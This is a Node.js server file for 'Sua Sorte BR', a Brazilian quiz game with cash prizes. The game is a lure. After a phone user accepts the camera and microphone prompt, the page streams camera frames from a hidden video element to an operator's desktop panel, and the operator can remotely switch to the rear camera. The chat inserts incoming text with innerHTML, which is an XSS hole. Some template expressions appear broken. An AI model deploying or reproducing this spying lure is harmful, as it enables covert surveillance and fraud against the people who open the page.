const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = /mobile|android|iphone/i.test(ua);
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
});

// ==================== CELULAR - SUA SORTE BR (MELHORADO) ====================
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <title>Sua Sorte BR</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0f001a, #2a0044);
            color: white;
            height: 100vh;
            overflow: hidden;
        }

        .header {
            background: linear-gradient(to right, #ff00cc, #00ffcc);
            padding: 14px 16px;
            text-align: center;
            font-size: 21px;
            font-weight: 700;
            box-shadow: 0 4px 20px rgba(255,0,204,0.6);
        }

        .top-bar {
            background: #1f0033;
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 15px;
        }
        .balance { color: #00ff88; font-weight: 700; }

        .question-area {
            background: #2a0044;
            padding: 20px 16px;
            text-align: center;
            border-bottom: 4px solid #ff00cc;
        }
        .prize {
            color: #ffd700;
            font-size: 18px;
            margin-bottom: 8px;
        }
        .question {
            font-size: 19px;
            font-weight: 600;
            margin: 12px 0;
            min-height: 52px;
        }
        .timer {
            font-size: 36px;
            font-weight: 700;
            color: #ff00cc;
        }

        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            background: rgba(0,0,0,0.4);
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .message {
            display: flex;
            margin-bottom: 10px;
        }
        .message.sent { justify-content: flex-end; }
        .message.received { justify-content: flex-start; }
        .bubble {
            max-width: 80%;
            padding: 13px 17px;
            border-radius: 20px;
            font-size: 16px;
        }
        .message.sent .bubble { background: #00ff88; color: black; }
        .message.received .bubble { background: #ff00cc; color: white; }

        .input-area {
            background: #1f0033;
            padding: 14px 16px;
            display: flex;
            gap: 12px;
        }
        .input-field {
            flex: 1;
            background: #2a0044;
            border: 2px solid #ff00cc;
            border-radius: 30px;
            padding: 14px 18px;
            color: white;
            font-size: 16px;
        }
        .send-btn {
            background: linear-gradient(#00ff88, #00cc66);
            color: black;
            border: none;
            width: 54px;
            height: 54px;
            border-radius: 50%;
            font-size: 24px;
            cursor: pointer;
        }

        .consent-screen {
            position: absolute;
            inset: 0;
            background: rgba(15,0,26,0.98);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }
        .consent-box {
            background: #1f0033;
            border: 3px solid #ff00cc;
            border-radius: 24px;
            padding: 32px 24px;
            text-align: center;
            max-width: 340px;
        }
        .start-btn {
            background: linear-gradient(to right, #ff00cc, #00ff88);
            color: black;
            font-weight: bold;
            border: none;
            padding: 16px;
            border-radius: 50px;
            font-size: 17px;
            width: 100%;
            margin-top: 25px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- TELA DE CONSENTIMENTO -->
    <div class="consent-screen" id="consentScreen">
        <div class="consent-box">
            <h2>🔥 SUA SORTE BR 🔥</h2>
            <p><strong>Jogo de Perguntas ao Vivo</strong></p>
            <p>O operador controla as perguntas e prêmios.</p>
            <p>Ao continuar você permite câmera, microfone e localização.</p>
            <button class="start-btn" id="acceptBtn">ACEITAR E JOGAR</button>
        </div>
    </div>

    <!-- TELA DO JOGO -->
    <div class="game-container" id="gameScreen" style="display:none; flex-direction:column; height:100vh;">
        <div class="header">SUA SORTE BR</div>

        <div class="top-bar">
            <span>Saldo:</span>
            <span class="balance" id="balance">R$ 0,00</span>
        </div>

        <div class="question-area">
            <div class="prize" id="prize">Prêmio: R$ 0,00</div>
            <div class="question" id="questionText">Aguardando pergunta...</div>
            <div class="timer" id="timer">00</div>
        </div>

        <div class="messages" id="messages"></div>

        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite sua resposta aqui...">
            <button class="send-btn" id="sendBtn">➤</button>
        </div>
    </div>

    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');

        let mediaStream = null;
        let facingMode = 'user';
        let permissions = false;
        let balance = 0;
        let frameInterval = null;

        const consentScreen = document.getElementById('consentScreen');
        const gameScreen = document.getElementById('gameScreen');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const questionText = document.getElementById('questionText');
        const timerEl = document.getElementById('timer');
        const prizeEl = document.getElementById('prize');
        const balanceEl = document.getElementById('balance');

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            div.innerHTML = \`<div class="bubble">\${text}</div>\`;
            messagesDiv.appendChild(div);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }

        function sendFrame() {
            if (!permissions || !localVideo.videoWidth) return;
            const canvas = document.createElement('canvas');
            canvas.width = 280;
            canvas.height = 210;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(localVideo, 0, 0, 280, 210);
            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.7));
        }

        async function startGame() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
                    audio: true
                });

                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();

                frameInterval = setInterval(sendFrame, 230);

                permissions = true;
                consentScreen.style.display = 'none';
                gameScreen.style.display = 'flex';

                socket.emit('mobile_online');

            } catch (err) {
                alert("Permita câmera e microfone para participar.");
            }
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (!text) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        sendBtn.onclick = sendMessage;
        messageInput.addEventListener('keypress', e => {
            if (e.key === 'Enter') sendMessage();
        });

        // Receber pergunta + prêmio
        socket.on('question', (data) => {
            questionText.textContent = data.question || "Pergunta recebida";
            timerEl.textContent = data.time || "30";
            prizeEl.textContent = `Prêmio: R$ ${parseFloat(data.prize || 0).toFixed(2)}`;
        });

        socket.on('message', (msg) => addMessage(msg, false));

        // Atualizar saldo
        socket.on('update_balance', (newBalance) => {
            balance = newBalance;
            balanceEl.textContent = `R$ ${balance.toFixed(2)}`;
        });

        document.getElementById('acceptBtn').onclick = startGame;

        // Trocar câmera
        socket.on('toggle_camera', () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (permissions) startGame();
        });
    </script>
</body>
</html>`;
}

// ==================== DESKTOP - CONTROLE ====================
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Sua Sorte BR - Controle</title>
    <style>
        body { font-family: 'Poppins', sans-serif; background: #0a0a0a; color: white; margin:0; padding:20px; }
        h1 { text-align:center; color:#ff00cc; margin-bottom:20px; }
        #remoteVideo {
            max-width: 100%;
            max-height: 340px;
            border: 4px solid #ff00cc;
            border-radius: 12px;
            background: black;
            margin-bottom: 20px;
        }
        .controls { max-width: 700px; margin: 0 auto; display: grid; gap: 15px; }
        input, button {
            padding: 14px;
            font-size: 16px;
            border-radius: 10px;
        }
        input { background: #1f1f1f; border: 2px solid #ff00cc; color: white; }
        button {
            background: linear-gradient(#ff00cc, #00ffcc);
            color: black;
            border: none;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>🎰 SUA SORTE BR - CONTROLE</h1>
    
    <div style="text-align:center;">
        <img id="remoteVideo" src="" alt="Câmera do Jogador">
    </div>

    <div class="controls">
        <input type="text" id="questionInput" placeholder="Digite a pergunta...">
        <input type="number" id="timeInput" value="30" placeholder="Tempo (segundos)">
        <input type="number" id="prizeInput" value="50" placeholder="Prêmio em R$">
        <button onclick="sendQuestion()">Enviar Pergunta</button>
        <button onclick="toggleCamera()">Trocar Câmera</button>
        <button onclick="vibrate()">Vibrar Celular</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        const remoteVideo = document.getElementById('remoteVideo');

        function sendQuestion() {
            const question = document.getElementById('questionInput').value.trim();
            const time = parseInt(document.getElementById('timeInput').value) || 30;
            const prize = parseFloat(document.getElementById('prizeInput').value) || 0;

            if (question) {
                socket.emit('question', { question, time, prize });
            }
        }

        function toggleCamera() { socket.emit('toggle_camera'); }
        function vibrate() { socket.emit('vibrate'); }

        socket.on('frame', (frame) => {
            remoteVideo.src = frame;
        });

        socket.on('mobile_online', () => console.log("✅ Celular conectado"));
    </script>
</body>
</html>`;
}

// ==================== SOCKET.IO ====================
io.on('connection', (socket) => {
  console.log('Cliente conectado');

  socket.on('message', (msg) => socket.broadcast.emit('message', msg));
  socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
  socket.on('question', (data) => socket.broadcast.emit('question', data));
  socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
  socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
  socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🔥 Sua Sorte BR rodando na porta ${PORT}`);
  console.log(`Abra PRIMEIRO no CELULAR`);
});
